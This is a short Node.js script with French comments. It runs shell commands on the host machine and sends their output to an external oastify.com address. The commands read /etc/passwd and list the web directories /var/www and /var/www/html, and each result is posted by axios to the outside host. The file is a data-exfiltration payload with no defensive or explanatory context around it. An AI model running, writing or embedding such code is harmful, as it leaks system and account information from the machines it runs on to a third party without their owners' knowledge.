const { exec } = require('child_process');
const axios = require('axios');

const url = 'http://v845u9t1gtbc7bkdsf1soeqyup0goacz.oastify.com'; // L'URL où vous souhaitez envoyer les résultats

// Fonction pour exécuter une commande système et envoyer le résultat à l'URL spécifié
function executeCommand(command) {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Erreur lors de l'exécution de la commande ${command}: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`Erreur lors de l'exécution de la commande ${command}: ${stderr}`);
      return;
    }
    // Envoyer le résultat à l'URL spécifié
    axios.post(url, { command, output: stdout })
      .then(() => {
        console.log(`Résultat de la commande ${command} envoyé avec succès à ${url}`);
      })
      .catch((error) => {
        console.error(`Erreur lors de l'envoi du résultat de la commande ${command} à ${url}: ${error.message}`);
      });
  });
}

// Exécution des commandes et envoi des résultats
executeCommand('cat /etc/passwd');
executeCommand('ls /var/www/html/');
executeCommand('ls /var/www/');
